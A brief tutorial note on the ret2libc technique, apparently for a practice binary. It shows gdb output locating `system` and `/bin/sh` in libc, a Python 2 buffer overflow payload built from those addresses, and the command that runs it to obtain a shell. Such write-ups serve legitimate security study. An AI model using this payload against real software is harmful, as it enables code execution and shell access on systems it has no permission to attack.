# ret2libc

After finding the `offset`, we need to execute the `system` function and give it `/bin/sh` as argument

```sh
(gdb) print system
# $1 = {<text variable, no debug info>} 0xf7c4c870 <system>
```

```sh
(gdb) find /bin/sh
# Searching for '/bin/sh' in: None ranges
# Found 1 results, display max 1 items:
#libc.so.6 : 0xf7db5fc8 ("/bin/sh")
```

Once we know the memory addresses of `system` and `/bin/sh` we can use the following script to exploit it

```python
buf = "A" * 54 # Offset
buf +=  "\x70\xc8\xc4\xf7" # system <--- reverse notation
buf += "\x90" * 4 # NOPs
buf += "\xc8\x5f\xdb\xf7" # /bin/sh <-- reverse notation
print buf
```

Execute the program to get a shell

```sh
./run $(python2 exploit.py)
```
